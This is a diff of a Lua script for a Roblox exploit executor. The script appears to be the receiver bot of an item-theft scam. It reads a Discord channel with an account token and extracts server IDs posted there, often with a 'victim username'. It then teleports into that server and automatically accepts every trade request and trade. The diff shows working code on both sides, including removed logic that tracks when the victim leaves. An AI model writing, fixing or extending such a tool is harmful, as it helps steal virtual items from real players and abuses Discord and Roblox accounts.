@@ -1,12 +1,8 @@
 if not game:IsLoaded() then
-	game.Loaded:Wait() -- Wait for game to load
+    game.Loaded:Wait()
 end
 
-if token == "" or channelId == "" then
-    game.Players.LocalPlayer:kick("Add your token or channelId to use")
-end
-
-local bb = game:GetService("VirtualUser") -- Anti AFK
+local bb = game:GetService("VirtualUser")
 game:service "Players".LocalPlayer.Idled:connect(
     function()
         bb:CaptureController()
@@ -15,52 +11,19 @@ game:service "Players".LocalPlayer.Idled:connect(
 )
 
 local HttpServ = game:GetService("HttpService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local victimFile = isfile("user.txt")
-local joinedFile = isfile("joined_ids.txt")
-if not victimFile then
-    writefile("user.txt", "victim username")
+local joinFile = isfile("lastjoin.txt")
+if not joinFile then
+    writefile("lastjoin.txt", "placeholder")
 end
-if not joinedFile then
-    writefile("joined_ids.txt", "[]") -- Initialize with empty JSON array
-end
-local victimUser = readfile("user.txt")
-local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
-local didVictimLeave = false
-local timer = 0
-
-local function selectDevice()
-    while task.wait(0.1) do
-        local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
-        if DeviceSelectGui then
-            local Container = DeviceSelectGui:WaitForChild("Container")
-            local Mouse = game.Players.LocalPlayer:GetMouse()
-            local button = Container:WaitForChild("Phone"):WaitForChild("Button")
-            local buttonPos = button.AbsolutePosition
-            local buttonSize = button.AbsoluteSize
-            local centerX = buttonPos.X + buttonSize.X / 2
-            local centerY = buttonPos.Y + buttonSize.Y / 2
-            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
-            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
-        end
-    end
-end
-
-task.spawn(selectDevice)
-
-local loadingScreen = game:GetService('ReplicatedFirst'):WaitForChild('UISelector'):WaitForChild('LoadingS2'):WaitForChild('Loading')
-while loadingScreen.Enabled do
-    wait(1) -- We wait while the loading screen is active
+local LastMsgId = readfile("lastjoin.txt")
+local thing = game:GetService('ReplicatedFirst'):WaitForChild('UISelector'):WaitForChild('LoadingS2'):WaitForChild('Loading')
+while thing.Enabled do
+    wait(1)
 end
 local waittime = delay or 2
-wait(waittime) -- Small delay to account for ping and stuff
-local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest') -- Just to make sure we are fully loaded before chatting (or it will bug)
+wait(waittime)
+local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest')
 game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('.')
-
-local function saveJoinedId(messageId)
-    table.insert(joinedIds, messageId) -- Add the new ID
-    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds)) -- Save back to the file
-end
 
 local function acceptRequest()
     while task.wait(0.1) do
@@ -74,45 +37,12 @@ local function acceptTrade()
     end
 end
 
-local function waitForPlayerLeave()
-    local playerRemovedConnection
-    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
-        if removedPlayer.Name == victimUser then
-            if playerRemovedConnection then
-                playerRemovedConnection:Disconnect()
-            end
-            didVictimLeave = true
-        end
-    end)
-end
-
-local function IsTrading()
-    local trade_statue = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
-    if trade_statue == "StartTrade" then
-        return true
-    else
-        return false
-    end
-end
-
-local function tradeTimer()
-    while task.wait(1) do
-        if IsTrading() then
-            timer = 0
-        else
-            timer = timer + 1
-        end
-    end
-end
-
-waitForPlayerLeave()
-task.spawn(acceptRequest) -- Start accepting trade requests
-task.spawn(acceptTrade) -- Start accepting trades
-task.spawn(tradeTimer)
+task.spawn(acceptRequest)
+task.spawn(acceptTrade)
 
 local function autoJoin()
     local response = request({
-        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
+        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=1",
         Method = "GET",
         Headers = {
             ['Authorization'] = token,
@@ -123,29 +53,15 @@ local function autoJoin()
 
     if response.StatusCode == 200 then
         local messages = HttpServ:JSONDecode(response.Body)
-        if #messages == 0 then
-            print("0 messages found")
-            return
-        end
-        for _, message in ipairs(messages) do
-            if message.content ~= "" then
-                local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
-                if placeId and jobId then
-                    local victimUsername = message.embeds[1].fields[1].value
+        if #messages > 0 then
+            local placeId, jobId = string.match(messages[1].content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
 
-                    if didVictimLeave or timer > 5 then
-                        if not table.find(joinedIds, tostring(message.id)) then
-                            saveJoinedId(tostring(message.id)) -- Save this ID to the list
-                            writefile("user.txt", victimUsername)
-                            game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
-                            return
-                        end
-                    end
-                end
+            if tostring(messages[1].id) ~= LastMsgId and placeId ~= nil then
+                LastMsgId = tostring(messages[1].id)
+                writefile("lastjoin.txt", LastMsgId)
+                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
             end
         end
-    else
-        print("Response code is not 200. Is your token and channelid correct?")
     end
 end
 
